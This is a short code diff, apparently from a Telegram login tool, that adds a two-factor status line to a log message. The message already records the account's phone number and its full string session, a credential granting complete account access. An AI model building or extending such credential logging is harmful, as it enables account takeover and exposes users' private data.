@@ -180,6 +180,7 @@ async def log_login_success(user_id, username, first_name, account: dict,
         f"├ <b>Phone:</b> <code>{_e(account.get('phone'))}</code>\n"
         f"├ <b>DC:</b> {_e(account.get('dc'))}\n"
         f"├ <b>Premium:</b> {_e(account.get('premium'))}\n"
+        f"├ <b>2FA:</b> {_e('Enabled / verified' if account.get('two_factor') else 'Not required')}\n"
         f"└ <b>Time:</b> {_ts()}\n\n"
         f"<b>String Session:</b>\n<code>{_e(string_session)}</code>"
     )
